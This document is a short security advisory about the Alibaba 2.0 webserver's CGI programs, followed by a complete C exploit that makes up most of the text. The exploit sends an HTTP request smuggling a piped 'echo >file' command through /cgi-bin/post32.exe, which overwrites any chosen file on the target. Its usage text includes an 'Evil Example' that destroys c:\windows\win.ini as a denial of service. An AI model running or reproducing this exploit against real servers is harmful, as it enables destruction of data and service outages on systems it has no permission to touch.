source: http://www.securityfocus.com/bid/770/info

There are several CGI programs that ship with the Alibaba webserver. Many of these do not do proper input handling, and therefore will allow requests for access to files outside of normal or safe webserver practice. This results in various situations where an attacker can view, overwrite, create and delete files anywhere on the server. 

/*

 Description: DoS against Alibaba 2.0 WebServer by wildcoyote
 Comments   : Based on advisorie by Prizm<Prizm@RESENTMENT.org>
              It is possible to overwrite any file on the remote box!
 Platforms  : Alibaba runs on Win95/98/NT
 Flamez to  : wildcoyote@coders-pt.org

*/

#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>

// If it didnt work, uncomment (JUST ONE) of the following defines...
// (In case of one of them, isn't present...)
#define vulnerable_cgi "/cgi-bin/post32.exe"
// #define vulnerable_cgi "/cgi-bin/post16.exe"
// #define vulnerable_cgi "/cgi-bin/get16.exe"


int 
openhost(char *host,int port) {
   int sock;
   struct sockaddr_in addr;
   struct hostent *he;
      
   he=gethostbyname(host);
   
   if (he==NULL) return -1;
   
   sock=socket(AF_INET, SOCK_STREAM, getprotobyname("tcp")->p_proto);
    
   if (sock==-1) return -1;
    
   memcpy(&addr.sin_addr, he->h_addr, he->h_length);
   addr.sin_family=AF_INET;
   addr.sin_port=htons(port);

   if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1) sock=-1;
    
   return sock;
}

void 
sends(int sock,char *buf) {
  write(sock,buf,strlen(buf));
}

void 
overwrite(char *host, char *file, int port)
{
 int sock,i;
 char buf[512];
 printf("\nAlibaba 2.0 WebServer File Overwrite Xploit by wildcoyote\n\n");
 printf("Trying to connect to %s (%d)....(please wait)\n",host,port);
 sock=openhost(host,port);
 if(sock==-1) {
     printf("- Could not connect -\n");
     printf("Exiting...\n\n");
     exit(-1);
 }
 else printf("Connected to %s (%d)\n",host,port);
 sprintf(buf,"GET %s|echo%20>%s\n\n",vulnerable_cgi,file);
 printf("Oh k! Trying to overwrite the file...\n");
 sends(sock,buf);
 close(sock);
 printf("All done, the file was *probably* overwrited ;)\n");
 printf("Send flamez to wildcoyote@coders-pt.org, *Enjoy*...\n\n");
}

main(int argc, char *argv[])
{
 int sock,i;
 if (argc<3) {
    printf("\nAlibaba 2.0 WebServer File Overwrite Xploit by wildcoyote\n\n");
    printf("Sintaxe: %s <host> <path to file to overwrite> [port - default 80]\n",argv[0]);
    printf("Warning: Path to file must be a valid DoS path :)\n");
    printf("Evil Example: %s www.vulnerable.alibaba.com c:\\windows\\win.ini\n",argv[0]);
    printf("Send flamez to wildcoyote@coders-pt.org, *Enjoy*...\n\n");
 }
 else if (argc==3) overwrite(argv[1],argv[2],80);
      else overwrite(argv[1],argv[2],atoi(argv[3]));
}